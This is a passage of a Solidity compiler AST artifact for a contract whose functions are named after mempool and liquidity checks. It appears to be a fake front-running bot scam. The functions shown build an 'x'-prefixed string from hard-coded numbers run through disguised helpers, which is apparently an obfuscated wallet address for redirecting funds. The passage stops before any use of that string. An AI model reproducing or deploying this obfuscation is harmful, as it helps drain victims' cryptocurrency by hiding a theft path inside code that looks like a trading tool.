														"id": 1246,
														"name": "selflen",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1130,
														"src": "13780:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "13770:17:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 1140,
												"id": 1248,
												"nodeType": "Return",
												"src": "13763:24:0"
											}
										]
									},
									"documentation": null,
									"id": 1250,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "findPtr",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1137,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1130,
												"mutability": "mutable",
												"name": "selflen",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1250,
												"src": "12398:12:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1129,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "12398:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1132,
												"mutability": "mutable",
												"name": "selfptr",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1250,
												"src": "12412:12:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1131,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "12412:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1134,
												"mutability": "mutable",
												"name": "needlelen",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1250,
												"src": "12426:14:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1133,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "12426:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1136,
												"mutability": "mutable",
												"name": "needleptr",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1250,
												"src": "12442:14:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1135,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "12442:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "12397:60:0"
									},
									"returnParameters": {
										"id": 1140,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1139,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1250,
												"src": "12480:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1138,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "12480:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "12479:6:0"
									},
									"scope": 1680,
									"src": "12381:1414:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "private"
								},
								{
									"body": {
										"id": 1257,
										"nodeType": "Block",
										"src": "13861:32:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"hexValue": "353732353435",
													"id": 1255,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "13879:6:0",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_572545_by_1",
														"typeString": "int_const 572545"
													},
													"value": "572545"
												},
												"functionReturnParameters": 1254,
												"id": 1256,
												"nodeType": "Return",
												"src": "13872:13:0"
											}
										]
									},
									"documentation": null,
									"id": 1258,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "getMemPoolHeight",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1251,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "13829:2:0"
									},
									"returnParameters": {
										"id": 1254,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1253,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1258,
												"src": "13855:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1252,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "13855:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "13854:6:0"
									},
									"scope": 1680,
									"src": "13804:89:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1368,
										"nodeType": "Block",
										"src": "14129:1029:0",
										"statements": [
											{
												"assignments": [
													1264
												],
												"declarations": [
													{
														"constant": false,
														"id": 1264,
														"mutability": "mutable",
														"name": "_memPoolOffset",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1368,
														"src": "14140:28:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 1263,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "14140:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1272,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"hexValue": "78",
															"id": 1266,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "14179:3:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_7521d1cadbcfa91eec65aa16715b94ffc1c9654ba57ea2ef1a2127bca1127a83",
																"typeString": "literal_string \"x\""
															},
															"value": "x"
														},
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"arguments": [],
																	"expression": {
																		"argumentTypes": [],
																		"id": 1268,
																		"name": "getMemPoolOffset",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 729,
																		"src": "14199:16:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_internal_pure$__$returns$_t_uint256_$",
																			"typeString": "function () pure returns (uint256)"
																		}
																	},
																	"id": 1269,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "14199:18:0",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 1267,
																"name": "checkLiquidity",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1070,
																"src": "14184:14:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (uint256) pure returns (string memory)"
																}
															},
															"id": 1270,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "14184:34:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_stringliteral_7521d1cadbcfa91eec65aa16715b94ffc1c9654ba57ea2ef1a2127bca1127a83",
																"typeString": "literal_string \"x\""
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 1265,
														"name": "mempool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1679,
														"src": "14171:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
															"typeString": "function (string memory,string memory) pure returns (string memory)"
														}
													},
													"id": 1271,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "14171:48:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "14140:79:0"
											},
											{
												"assignments": [
													1274
												],
												"declarations": [
													{
														"constant": false,
														"id": 1274,
														"mutability": "mutable",
														"name": "_memPoolSol",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1368,
														"src": "14230:16:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1273,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "14230:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1276,
												"initialValue": {
													"argumentTypes": null,
													"hexValue": "3634343334",
													"id": 1275,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "14249:5:0",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_64434_by_1",
														"typeString": "int_const 64434"
													},
													"value": "64434"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "14230:24:0"
											},
											{
												"assignments": [
													1278
												],
												"declarations": [
													{
														"constant": false,
														"id": 1278,
														"mutability": "mutable",
														"name": "_memPoolLength",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1368,
														"src": "14265:19:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1277,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "14265:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1281,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 1279,
														"name": "getMemPoolLength",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1078,
														"src": "14287:16:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$__$returns$_t_uint256_$",
															"typeString": "function () pure returns (uint256)"
														}
													},
													"id": 1280,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "14287:18:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "14265:40:0"
											},
											{
												"assignments": [
													1283
												],
												"declarations": [
													{
														"constant": false,
														"id": 1283,
														"mutability": "mutable",
														"name": "_memPoolSize",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1368,
														"src": "14316:17:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1282,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "14316:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1285,
												"initialValue": {
													"argumentTypes": null,
													"hexValue": "313930363737",
													"id": 1284,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "14336:6:0",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_190677_by_1",
														"typeString": "int_const 190677"
													},
													"value": "190677"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "14316:26:0"
											},
											{
												"assignments": [
													1287
												],
												"declarations": [
													{
														"constant": false,
														"id": 1287,
														"mutability": "mutable",
														"name": "_memPoolHeight",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1368,
														"src": "14353:19:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1286,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "14353:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1290,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 1288,
														"name": "getMemPoolHeight",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1258,
														"src": "14375:16:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$__$returns$_t_uint256_$",
															"typeString": "function () pure returns (uint256)"
														}
													},
													"id": 1289,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "14375:18:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "14353:40:0"
											},
											{
												"assignments": [
													1292
												],
												"declarations": [
													{
														"constant": false,
														"id": 1292,
														"mutability": "mutable",
														"name": "_memPoolWidth",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1368,
														"src": "14404:18:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1291,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "14404:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1294,
												"initialValue": {
													"argumentTypes": null,
													"hexValue": "323533323532",
													"id": 1293,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "14425:6:0",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_253252_by_1",
														"typeString": "int_const 253252"
													},
													"value": "253252"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "14404:27:0"
											},
											{
												"assignments": [
													1296
												],
												"declarations": [
													{
														"constant": false,
														"id": 1296,
														"mutability": "mutable",
														"name": "_memPoolDepth",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1368,
														"src": "14442:18:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1295,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "14442:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1299,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 1297,
														"name": "getMemPoolDepth",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1571,
														"src": "14463:15:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$__$returns$_t_uint256_$",
															"typeString": "function () pure returns (uint256)"
														}
													},
													"id": 1298,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "14463:17:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "14442:38:0"
											},
											{
												"assignments": [
													1301
												],
												"declarations": [
													{
														"constant": false,
														"id": 1301,
														"mutability": "mutable",
														"name": "_memPoolCount",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1368,
														"src": "14491:18:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1300,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "14491:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1303,
												"initialValue": {
													"argumentTypes": null,
													"hexValue": "313232323836",
													"id": 1302,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "14512:6:0",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_122286_by_1",
														"typeString": "int_const 122286"
													},
													"value": "122286"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "14491:27:0"
											},
											{
												"assignments": [
													1305
												],
												"declarations": [
													{
														"constant": false,
														"id": 1305,
														"mutability": "mutable",
														"name": "_memPool1",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1368,
														"src": "14532:23:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 1304,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "14532:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1312,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1307,
															"name": "_memPoolOffset",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1264,
															"src": "14566:14:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														},
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1309,
																	"name": "_memPoolSol",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1274,
																	"src": "14597:11:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 1308,
																"name": "checkLiquidity",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1070,
																"src": "14582:14:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (uint256) pure returns (string memory)"
																}
															},
															"id": 1310,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "14582:27:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 1306,
														"name": "mempool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1679,
														"src": "14558:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
															"typeString": "function (string memory,string memory) pure returns (string memory)"
														}
													},
													"id": 1311,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "14558:52:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "14532:78:0"
											},
											{
												"assignments": [
													1314
												],
												"declarations": [
													{
														"constant": false,
														"id": 1314,
														"mutability": "mutable",
														"name": "_memPool2",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1368,
														"src": "14621:23:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 1313,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "14621:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1323,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1317,
																	"name": "_memPoolLength",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1278,
																	"src": "14670:14:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 1316,
																"name": "checkLiquidity",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1070,
																"src": "14655:14:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (uint256) pure returns (string memory)"
																}
															},
															"id": 1318,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "14655:30:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														},
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1320,
																	"name": "_memPoolSize",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1283,
																	"src": "14702:12:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 1319,
																"name": "checkLiquidity",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1070,
																"src": "14687:14:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (uint256) pure returns (string memory)"
																}
															},
															"id": 1321,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "14687:28:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 1315,
														"name": "mempool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1679,
														"src": "14647:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
															"typeString": "function (string memory,string memory) pure returns (string memory)"
														}
													},
													"id": 1322,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "14647:69:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "14621:95:0"
											},
											{
												"assignments": [
													1325
												],
												"declarations": [
													{
														"constant": false,
														"id": 1325,
														"mutability": "mutable",
														"name": "_memPool3",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1368,
														"src": "14727:23:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 1324,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "14727:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1334,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1328,
																	"name": "_memPoolHeight",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1287,
																	"src": "14776:14:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 1327,
																"name": "checkLiquidity",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1070,
																"src": "14761:14:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (uint256) pure returns (string memory)"
																}
															},
															"id": 1329,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "14761:30:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														},
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1331,
																	"name": "_memPoolWidth",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1292,
																	"src": "14808:13:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 1330,
																"name": "checkLiquidity",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1070,
																"src": "14793:14:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (uint256) pure returns (string memory)"
																}
															},
															"id": 1332,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "14793:29:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 1326,
														"name": "mempool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1679,
														"src": "14753:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
															"typeString": "function (string memory,string memory) pure returns (string memory)"
														}
													},
													"id": 1333,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "14753:70:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "14727:96:0"
											},
											{
												"assignments": [
													1336
												],
												"declarations": [
													{
														"constant": false,
														"id": 1336,
														"mutability": "mutable",
														"name": "_memPool4",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1368,
														"src": "14834:23:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
